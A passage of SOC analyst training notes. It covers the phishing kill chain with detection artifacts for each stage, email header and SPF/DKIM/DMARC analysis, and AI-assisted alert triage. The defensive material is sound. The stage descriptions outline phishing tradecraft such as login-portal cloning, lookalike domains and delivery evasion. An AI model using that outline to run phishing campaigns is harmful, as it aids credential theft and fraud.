    Technical reconnaissance: querying MX records, SPF / DKIM / DMARC configurations to assess spoofing viability; scanning for publicly exposed login portals to clone for credential harvesting; reviewing data breach databases for previously compromised credentials that could facilitate account compromise.

    Reconnaissance artifacts and detection:

    • Unusual spikes in LinkedIn profile views across employees in the same department.
    • Increased DNS queries for the organization's domains from scanning infrastructure.
    • Login attempts using credential-stuffed data from prior breaches.
    • MX record lookups and SPF / DKIM / DMARC queries from unknown sources.
    • Web scraping activity against the corporate website or employee directories.
    • Emails sent to non-existent addresses as the attacker validates email formats (address probing).
  3. 3.3

    Stage 2 — Weaponization

    Writing the email body with an appropriate pretext; designing the visual layout (cloning brand templates, matching corporate email signatures, inserting logos); setting up the sender identity (registering lookalike domains, configuring display-name spoofing, or preparing to send from a compromised account); tailoring personalization for targeted attacks.

    By objective:

    • Credential harvesting — building or deploying a phishing page that clones the target's login portal, configuring proxy infrastructure, setting up data exfiltration from form submissions.
    • Malware delivery — weaponizing documents with macros or exploits, preparing ISO / IMG containers, packaging HTML smuggling files, staging malware on infrastructure.
    • BEC — no technical payload.

    Weaponization artifacts and detection: newly registered domains visually similar to the org's domain or trusted brands (certificate transparency logs, domain registration databases); SSL certificates issued for suspicious domain names (CT); phishing kit files deployed on compromised or attacker-controlled web servers; malware samples compiled with recent timestamps, containing build-environment metadata; lookalike domains with supporting DNS records (MX, SPF, DKIM) configured for email delivery.

    Domain monitoring services alert on newly registered domains similar to your brand; threat intel feeds may flag known phishing-kit infrastructure or malware staging servers; certificate transparency monitoring can reveal suspicious SSL certs referencing your brand; typically managed by threat intel or security engineering teams, but SOC analysts should know these capabilities exist and can request lookups when investigating.

  4. 3.4

    Stage 3 — Delivery

    Email delivery methods:

    • Direct SMTP delivery from attacker-controlled mail servers using registered lookalike domains.
    • Delivery via compromised legitimate email accounts (thread hijacking, BEC).
    • Abuse of commercial email marketing platforms (Mailchimp, SendGrid, Amazon SES) to inherit sender reputation.
    • Routing through compromised corporate mail servers or SMTP relays.
    • Delivery through third-party collaboration platforms (Teams, Slack, SharePoint sharing notifications).

    Evasion techniques at delivery: sending from domains with valid SPF, DKIM, and DMARC to pass authentication; using newly registered domains with no negative reputation (zero-day domains); distributing sends across multiple sending IPs to avoid volume-based blocking; timing delivery during business hours to blend with normal email flow; sending to a small number of recipients to avoid bulk-detection thresholds; using legitimate services as redirectors (Google AMP, Microsoft Sway, Cloudflare Workers).

    Delivery artifacts: email headers (sending IP, Return-Path, SMTP HELO / EHLO values, Message-ID format, Received chain, authentication results); sender information (From address, Reply-To address, display name, envelope-sender discrepancies); domain intelligence (sending domain age, registration date, registrar, WHOIS privacy, DNS config); email gateway logs (delivery verdicts, spam scores, policy actions, quarantine events); volume patterns (multiple recipients receiving the same / similar messages in a short window).

    SOC detection opportunities: review email gateway alerts for authentication failures (SPF fail, DKIM mismatch, DMARC reject / quarantine); flag emails from newly registered domains (domains less than 30 days old warrant scrutiny); identify sender discrepancies (From / Reply-To mismatch, display-name impersonation of internal employees); detect bulk delivery patterns through SIEM correlation of email logs; investigate user-reported phishing submissions (the user is often the first detection layer at delivery).

  5. 3.5

    Stage 4 — Exploitation

    Credential harvesting exploitation: the victim clicks a link and lands on a phishing page mimicking a legitimate login portal; enters their username, password, and potentially completes an MFA challenge; the credentials (and session tokens, in AiTM attacks) are captured and stored or relayed to the attacker in real time; the victim is often redirected to the legitimate service afterward, masking the compromise.

    Malware execution exploitation: the victim opens a malicious attachment; the payload executes — macros run a PowerShell download cradle, an exploit triggers code execution, or the user is tricked into running an embedded executable; the initial malware stage (loader / dropper) executes in memory or writes to disk; exploitation may require user interaction (enabling macros, extracting archives, clicking through security warnings) or exploit a vulnerability directly.

    BEC exploitation: no technical exploitation occurs.

    Credential-harvesting artifacts: web proxy or DNS logs showing the user navigating to a known / suspected phishing URL; authentication logs showing a new login from an unusual IP, location, or device shortly after the phishing email was delivered; impossible-travel alerts (the user authenticated from their normal location and then from a geographically distant location within minutes); conditional access policy violations or blocked sign-in attempts from the attacker's infrastructure.

    Malware-execution artifacts: EDR alerts for suspicious process execution (Office apps spawning PowerShell or cmd, script execution from user temp directories, DLL sideloading); file-creation events (new executables / scripts in user-writable directories); AV / endpoint detections on the attachment or dropped payload; sandbox detonation results if the email gateway forwarded the attachment for analysis.

  6. 3.6

    Stage 5 — Installation

    Account-level persistence (credential-based attacks): creating inbox-forwarding rules to silently copy incoming email to an attacker-controlled address; registering new MFA devices or app passwords on the compromised account; granting OAuth consent to malicious applications that maintain access independently of the user's password; adding the attacker's email as a delegate or shared-mailbox member.

    System-level persistence (malware-based attacks): writing to startup directories, registry Run keys, or scheduled tasks; installing a backdoor or remote access trojan (RAT); DLL sideloading into legitimate applications; creating new local or domain accounts; deploying webshells on accessible servers if the compromised user has server access.

    Account-level artifacts: audit logs showing new inbox rules created (especially forwarding rules to external addresses); new MFA device enrollments or app-password creation in the identity provider's audit log; OAuth application consent events for unfamiliar / suspicious apps; delegate permissions or mailbox access changes; changes to mail transport rules at the org level (if an admin account is compromised).

    System-level artifacts: registry modifications in Run / RunOnce keys; new scheduled tasks or cron jobs; files dropped in startup directories, AppData, ProgramData, or temp folders; new services created or existing ones modified; process-creation events showing persistence tools executing at boot time; new local or domain account-creation events.

  7. 3.7

    Stage 6 — Command & Control

    Common C2 methods following phishing-delivered malware:

    • HTTP / HTTPS beaconing to attacker-controlled domains / IPs.
    • DNS tunneling (encoding commands / data in DNS queries and responses to bypass network monitoring).
    • Communication over legitimate cloud services (Discord, Telegram, Google Sheets, etc.).
    • Encrypted channels using legitimate protocols to avoid deep packet inspection.
    • Malleable C2 profiles (e.g., Cobalt Strike) that mimic normal web-browsing traffic patterns.
    • Beaconing at irregular intervals with jitter to avoid detection by time-based analytics.

    Network-level artifacts: DNS queries to newly registered, low-reputation, or algorithmically generated domains (DGA); periodic outbound HTTP / HTTPS connections to unfamiliar IPs / domains (beaconing patterns); unusual volume of DNS queries from a single host (potential DNS tunneling); outbound traffic to known C2 infrastructure flagged by threat intel feeds; TLS connections with suspicious certificate metadata (self-signed certs, mismatched subjects); connections to legitimate cloud services with unusual frequency or data-volume patterns.

    Host-level artifacts: processes maintaining persistent outbound connections; network connection events from unexpected applications (notepad.exe, calc.exe making outbound calls); injected code in legitimate processes making network connections.

  8. 3.8

    Stage 7 — Actions on Objectives

    Data theft and exfiltration: accessing / exfiltrating sensitive emails, documents, and files from the compromised account or connected systems; downloading entire mailbox contents or targeted message searches for financial, legal, or strategic information; exfiltrating data through cloud storage uploads, email forwarding, or C2 channels.

    Lateral movement: using compromised credentials to access additional systems, shares, and services; pivoting from a compromised workstation to other network segments; escalating privileges by targeting administrative accounts or exploiting local vulnerabilities; spreading malware (e.g., Emotet distributing further phishing from compromised mailboxes).

    Financial fraud: initiating fraudulent wire transfers or payment redirections (BEC); manipulating invoices, payroll records, or banking details; purchasing gift cards or cryptocurrency using compromised corporate accounts.

    Disruption and destruction: deploying ransomware to encrypt critical systems and demand payment; destroying or corrupting data; disrupting business operations through account lockouts or system sabotage.

    Data-theft artifacts: mailbox audit logs showing bulk message access, downloads, or export operations; cloud storage logs showing large file downloads or sharing-link creation; DLP alerts on sensitive content being moved to unauthorized locations; unusual data-transfer volumes in network flow data.

    Lateral-movement artifacts: authentication events across multiple systems from the same compromised account; new remote sessions (RDP, SSH, SMB) initiated from the compromised endpoint; pass-the-hash or pass-the-ticket activity detected by identity protection tools; internal phishing (the compromised account sending phishing emails to other employees).

    Financial-fraud artifacts: emails requesting wire transfers, payment changes, or sensitive data from the compromised account; finance team members reporting unusual requests from known internal senders; audit-trail discrepancies in payment-processing systems.

    Ransomware-deployment artifacts: mass file-encryption events detected by EDR or file-integrity monitoring; ransom notes appearing across file shares and endpoints; volume shadow copy deletion and backup disruption activities.

  9. 3.9

    Breaking the Chain, Daily Use, and Limitations

    Breaking the chain — what you can do at each stage:

    • Delivery: quarantine the phishing email across all recipient mailboxes.
    • Exploitation (Credential): initiate a password reset for all users who clicked the link.
    • Exploitation (Malware): isolate the affected endpoint via EDR; collect the malware sample and extract IoCs.
    • Installation: remove inbox forwarding rules and revoke rogue OAuth app consents.
    • Command & Control: block C2 domains and IPs at the firewall and DNS level; isolate communicating endpoints.
    • Actions on Objectives: escalate to the incident response team.

    Using the kill chain during daily triage — 4 questions:

    1. Where are we in the chain right now?
    2. What stage are we trying to prevent from happening next?
    3. What artifacts should I look for at the current and next stages?
    4. Who else is potentially affected?

    Kill chain limitations:

    • The linear assumption — real attacks don't always follow the stages in strict order.
    • Defender-focused blind spots.
    • Post-compromise depth — the framework can undersell how much happens after initial compromise.

Email Header Analysis

  1. 4.1

    Understanding Email Architecture

    Headers tell you things the attacker can't easily hide:

    • Where the email came from (not just what the From field claims).
    • Which servers handled the email and in what order.
    • Whether the sending domain's authentication checks passed or failed.
    • Whether the sender identity is consistent across all relevant fields.
    • When the email was sent versus when it claims to have been sent.
    • What email security controls evaluated the message and what they decided.

    Email architecture components:

    • MUA (Mail User Agent) — the email client the user interacts with directly (Outlook, Gmail, Thunderbird, Apple Mail, or any mobile email app).
    • MTA (Mail Transfer Agent) — the server software responsible for routing and delivering email between systems.
    • MDA (Mail Delivery Agent) — the component that places the email into the recipient's mailbox for retrieval; handles the final step.

    The SMTP flow:

    1. Composition

      Sender composes the email in their MUA.

    2. Submission

      The MUA submits the message to its outgoing MTA via SMTP, typically port 587 / submission or 465 / SMTPS.

    3. DNS lookup

      The sender's MTA queries DNS for the recipient domain's MX record.

    4. SMTP relay

      The sender's MTA connects to the recipient's MTA, identified by the MX record, over port 25 and delivers the message.

    5. Delivery

      The recipient's MTA / MDA deposits the message into the recipient's mailbox.

    6. Header record

      The complete journey is recorded in the email headers.

  2. 4.2

    SMTP Envelope vs. Email Header, and Header Anatomy

    The SMTP envelope: used during the SMTP transaction between mail servers; contains the MAIL FROM address (who the server says is sending) and the RCPT TO address (who the server says should receive it).

    The email header: part of the message content itself; contains the From field (the address displayed to the recipient), along with Reply-To, Subject, Date, and other fields.

    Anatomy of an email header (read from bottom to top for chronological order):

    • Routing headers: Received, Return-Path (trace the delivery path).
    • Sender identity headers: From, Reply-To, Sender (identify the sender).
    • Recipient headers: To, Cc, Bcc.
    • Message metadata: Subject, Date, Message-ID, MIME-Version, Content-Type.
    • Authentication headers: Authentication-Results, Received-SPF, DKIM-Signature, ARC headers.
    • Custom and vendor headers: X-* headers and proprietary fields added by email security gateways, spam filters, and processing systems.
  3. 4.3

    Key Fields

    Sender identity fields:

    • From: the email address and display name shown to the recipient in their client.
    • Return-Path (Envelope From / MAIL FROM): the address specified in the SMTP envelope during the mail transaction.
    • Reply-To: the address that receives replies when the recipient clicks "Reply."
    • Sender: an optional field indicating the agent responsible for sending; some clients display a "sent on behalf of" notice when this differs from the From field.

    Routing and metadata fields:

    • Received: the most critical header for delivery-path analysis.
    • Message-ID: a unique identifier assigned by the originating mail server.
    • Date: the date / timestamp the email was composed, as set by the sender's MUA.
    • Subject: the subject line.
    • MIME-Version and Content-Type: define the message format (plain text, HTML, multipart, or with attachments).
  4. 4.4

    Tracing the Delivery Path

    Reading order: each server prepends its header above the previous ones — you must read Received headers from bottom to top to follow the message chronologically.

    Breaking down a Received header:

    • From — the hostname the sending server identified itself as via HELO / EHLO, plus its actual hostname / IP in parentheses.
    • By — the receiving server that processed the message and wrote this header.
    • With — the transfer protocol (SMTP, ESMTP, ESMTPS for encrypted).
    • Id — the receiving server's internal tracking ID.
    • For — the recipient address.
    • Timestamp — when the receiving server accepted the message.

    Received headers — what to look for:

    • Consistency checks: does the originating server's IP resolve to the domain claiming to send the email (reverse DNS / PTR lookup)? Does the originating IP belong to the expected mail service provider (an email claiming to be from M365 should originate from Microsoft IP ranges, not an unrelated VPS)? Are the hostnames in the Received chain consistent with the claimed sending organization?
    • Identifying the trust boundary: your organization's mail servers are the trust boundary. Received headers added by your own mail infrastructure (email gateway, internal mail servers) are generated by servers you control. Received headers below the trust boundary are generated by servers outside your control and can be fabricated — attackers can insert fake Received headers to make the delivery path appear legitimate.
    • Timestamp progression: timestamps should progress chronologically from bottom to top; each hop should be seconds to minutes apart. Anomalies to watch for: timestamps that go backward (potentially fabricated headers) and unusually large time gaps between hops.

    Worked real examples of Received-header sets:

    • Legitimate — mail forwarded via mail-yw1-f169.google.com to mx.company.com.
    • Spoofed — Received: from unknown (HELO mail.microsoft.com) (185.234.72.19) by mx.company.com — a suspicious IP falsely claiming to be Microsoft's hostname.
  5. 4.5

    Identifying Sender Spoofing
    • From ≠ Return-Path — the From field shows support@trustedbank.com but the Return-Path shows x7k2m@cheap-hosting-provider.com.
    • From ≠ Reply-To — the From field shows ceo@yourcompany.com but the Reply-To points to ceo.yourcompany@gmail.com.
    • Display-name spoofing — the From field shows John Smith CEO <random@attacker-domain.com>.
    • Cousin domain — all three fields consistently use support@trustedbank-secure.com (instead of trustedbank.com).
  6. 4.6

    SPF, DKIM & DMARC
    • SPF (Sender Policy Framework) — allows a domain owner to publish a DNS record specifying which IP addresses / mail servers are authorized to send email on behalf of that domain. How it works: an email arrives with a Return-Path; the receiving server queries DNS for the domain's SPF record (e.g., v=spf1 include:_spf.google.com ip4:203.0.113.0/24 -all); the server checks whether the connecting IP matches any authorized source; the result is recorded in the Authentication-Results header. SPF answers: "Is this server authorized to send email for this domain?"
    • DKIM (DomainKeys Identified Mail) — allows the sending mail server to cryptographically sign portions of the email (headers and body) using a private key; the receiving server retrieves the corresponding public key from the sending domain's DNS records and verifies the signature. DKIM answers: "Was this email signed by the claimed sending domain, and is it unaltered?"
    • DMARC (Domain-based Message Authentication, Reporting and Conformance) — builds on SPF and DKIM by adding a critical missing piece: alignment — DMARC checks whether the domain in the From header (what the user actually sees) aligns with the domain validated by SPF (Return-Path) or DKIM (d= signing domain). DMARC answers: "Does the From address the user sees align with the domain verified by SPF or DKIM, and what should we do if it doesn't?"

    What this means for phishing analysis:

    • SPF fail + DKIM none + DMARC fail — classic spoofing from unauthorized infrastructure. If the DMARC policy is reject or quarantine, the email should have been blocked.
    • SPF pass + DKIM pass + DMARC pass — the email came from authorized infrastructure. If still suspicious, consider a compromised account or legitimate-platform abuse.
    • SPF pass + DKIM fail + DMARC fail — SPF passed for the Return-Path domain, but it doesn't align with the From domain — the attacker sent from their own domain while spoofing the From address.

AI Fundamentals

  1. 1.1

    What Is Artificial Intelligence?

    Two formal definitions cited:

    • NIST — "A machine-based system that can, for a given set of human-defined objectives, make predictions, recommendations, or decisions influencing real or virtual environments."
    • ISO/IEC 22989:2022 — "An engineered system that generates outputs such as content, forecasts, recommendations or decisions for a given set of human-defined objectives."

    What AI is: simulation of human intelligence in machines (learning, reasoning, problem-solving, language understanding, etc.).

    • Narrow AI — limited scope, non-sentient (what exists today).
    • Artificial General Intelligence (AGI) — a theoretical concept, self-aware intelligence (not yet real).
    • Machine Learning (ML) — algorithms that learn from large data sets, make predictions or decisions, and improve over time; split into Supervised and Unsupervised learning.
  2. 1.2

    Generative AI & LLMs

    Generative AI — algorithms that create content through generative modeling (images, text, music, videos, etc.), matching or resembling the patterns and characteristics of their training data.

    Generative Adversarial Network (GAN) — two neural networks trained against each other: the Generator creates new data, the Discriminator evaluates data from the generator; they work against each other until the discriminator can no longer tell real from fake data.

    Large Language Models (LLMs) — a type of generative AI trained on massive amounts of data (books, articles, blogs, social networks, etc.); they learn language patterns, grammar, syntax, and context, specializing in mimicking human-created content. Text generation works by predicting the next word in a sentence based on context.

    Common uses: interactive conversational chatbots, text-based content creation, summarization of security log data.

  3. 1.3

    AI vs. Machine Learning vs. Automation

    Why these terms get confused: vendors use terms inconsistently; tools often combine all three; analysts see outputs, not internals; clarity improves trust and judgment.

    Automation — the simplest concept: executes predefined actions, follows explicit instructions, no learning or reasoning, predictable and repeatable.

    Machine Learning: algorithms trained to make decisions or predictions without explicit programming.

    • Supervised learning — trained on "labeled" data (e.g., pictures of animals labeled dogs / cats / horses before training).
    • Unsupervised learning — the algorithm must find patterns and structures in unlabeled data.
    • Reinforcement learning — training through trial and error with a reward system.

    Artificial Intelligence — the umbrella term: a broad category of intelligent behavior that includes rules, ML, and reasoning systems; produces recommendations or decisions; often assists humans, not replaces them.

    How they work together in a SOC (a closed loop):

    1. ML identifies unusual or risky behavior

      Pattern anomalies surface.

    2. AI correlates and explains the findings

      Context added to raw anomalies.

    3. Automation executes predefined responses

      Playbook actions run.

    4. Analysts oversee and decide

      Human-in-the-loop verification.

    How AI Is Used in Modern SOCs

Anomaly Detection & SIEM AI

  1. 3.1

    Understanding Anomaly Detection

    Detection approaches, in increasing order of flexibility: Signature → Rules → Behavior → Anomalies.

    "Signatures are discrete. Anomalies are not."

    What anomaly detection is: detects behavior that deviates from normal; based on historical patterns; often powered by machine learning; focuses on "unusual," not "malicious."

  2. 3.2

    What Anomaly Detection Is Good At — Three Worked Examples

    New Threats

    • Example: a workstation begins making outbound connections to a domain with no known-bad reputation, using legitimate software.
    • Why it triggers: this behavior has never been seen before in the environment.
    • Analyst takeaway: "This isn't known bad — but it's new, rare, and unusual enough to deserve investigation."

    Behavior Changes

    • Example: a user who normally logs in once per day now logs in slightly more frequently, with login times gradually shifting outside normal working hours.
    • Why it triggers: over time, the pattern slowly drifts from the baseline.
    • Analyst takeaway: "Nothing here breaks the rules — but the behavior is changing in a way attackers often start."

    Low-and-Slow Activity

    • Example: a compromised account accesses one new system per day, with small and infrequent data transfer volumes.
    • Why it triggers: the cumulative behavior is unusual compared to historical norms.
    • Analyst takeaway: "Attackers are staying under the radar — anomaly detection catches what thresholds miss."
  3. 3.3

    Considerations for a SOC Analyst

    Why anomalies create false positives: new software or workflows; admin or maintenance activity; one-time or first-seen behavior; changing environments.

    How to treat anomalies: a starting point, not a verdict; validate with logs and context; look for corroborating evidence; document conclusions clearly.

    Key dependency: anomaly detection depends on a good baseline.

  4. 3.4

    How SIEMs Use AI for Alerting and Correlation

    The problem SIEMs are solving: massive volumes of log and event data; many signals are weak on their own; manual correlation does not scale; analysts need fewer, better alerts.

    Where AI fits in SIEM alerting: detecting unusual or risky behavior; scoring events and entities; reducing alert noise; prioritizing analyst attention.

    What analysts see in practice: fewer, higher-quality alerts; alerts tied to users or hosts; risk or confidence scores; contextual summaries.

    Analyst responsibilities: AI suggests, analysts confirm; correlation does not prove intent; false positives still occur; evidence validation is required.

Interpreting AI Alerts, Risk Scores & EDR

  1. 4.1

    What "AI-Generated Alerts" Really Mean

    Key points: AI in the SOC is primarily used to detect anomalous behavior, correlate weak signals across data sources, and assign risk or confidence scores. These alerts are not definitive incidents — they are probabilistic assessments, not facts. Most AI alerts answer: "How unusual or risky is this compared to normal?"

    What the analyst actually sees — common elements across tools: alert title / description; entities involved (user, host, IP, process); time window and frequency; supporting evidence or contributing signals; risk score / severity / confidence.

    Examples by vendor:

    VendorTerminology
    SplunkRisk Score, Notable Event, Risk Object
    ElasticML Anomaly Score, Anomaly Severity
    SIEMs generallyHigh / Medium / Low plus a numeric score

    Key mindset shift: analysts investigate why the model is concerned, not just what happened.

  2. 4.2

    Common False Positives and Why They Happen

    Very common causes: new software or patching activity; admins behaving differently than usual; first-time logins, new devices, travel; incomplete or noisy data sources.

    Why AI flags these: baselines haven't adapted yet; models favor sensitivity over certainty; "unusual" ≠ "malicious."

    Analyst responsibility: document false positives; provide feedback when tooling supports it; recognize recurring benign patterns.

  3. 4.3

    Key Takeaways for a Level 1 Analyst
    • AI alerts are starting points, not conclusions.
    • Risk scores help prioritize, not decide.
    • Always validate with logs and context.
    • Treat AI as a junior analyst that never sleeps.
  4. 4.4

    How EDR Uses AI to Detect Malicious Behavior

    What EDR observes on the endpoint: continuous monitoring of endpoint activity; process execution and parent-child relationships; command-line arguments and script execution; file, registry, and memory behavior; outbound network connections from processes.

    Why behavior-based detection is required: malware constantly changes hashes and filenames; living-off-the-land tools appear legitimate; file reputation alone is unreliable; attacker tradecraft is more consistent than malware.

    What an AI-driven EDR alert looks like: detection name and mapped technique; severity or confidence score; affected endpoint and user; timeline of actions; visual process tree.

    Key takeaways: EDR AI focuses on attacker behavior; behavior detection works across malware variants; process trees are critical investigation tools; analysts confirm and contextualize detections.

Prompting & GenAI for Investigation and Documentation

  1. 6.1

    Writing Effective Prompts for Alert Triage

    Why prompts matter: GenAI responses depend heavily on input; vague prompts produce vague answers; good prompts save investigation time; analysts remain responsible for outcomes.

    What makes a prompt effective: a clear task or goal; relevant context included; specific questions asked; appropriate scope.

    Poor vs. effective prompt examples:

    • Poor: "Is this alert bad?" → Better: "Summarize the behavior that triggered this alert."
    • Poor: "Explain this log." → Better: "Explain why this process execution might be suspicious in a SOC context."

    Prompts analysts can use during triage:

    • "Summarize the key events in this alert."
    • "Explain why this behavior is unusual."
    • "What MITRE ATT&CK techniques might align with this activity?"
    • "What additional logs would help validate this alert?"

    Guardrails and best practices: never paste sensitive data unnecessarily; validate AI output against logs; treat responses as guidance, not fact; document decisions in your own words.

    Key takeaways for SOC analysts: prompts shape AI usefulness; ask for explanations, not verdicts; context improves results; analysts remain accountable.

  2. 6.2

    Using GenAI to Assist Investigations

    Where GenAI fits in investigations: assists understanding, not detection; works alongside SIEM and EDR tools; best used after an alert is raised; supports analyst decision-making, not replaces it.

    Common investigation tasks GenAI supports: summarizing alert timelines; explaining logs and process behavior; mapping activity to attack techniques; identifying investigative pivots.

    Practical prompt examples:

    • "Summarize the sequence of events for this host."
    • "Explain why this process chain might indicate malicious behavior."
    • "Which MITRE ATT&CK techniques align with this activity?"
    • "What evidence would confirm or refute this hypothesis?"
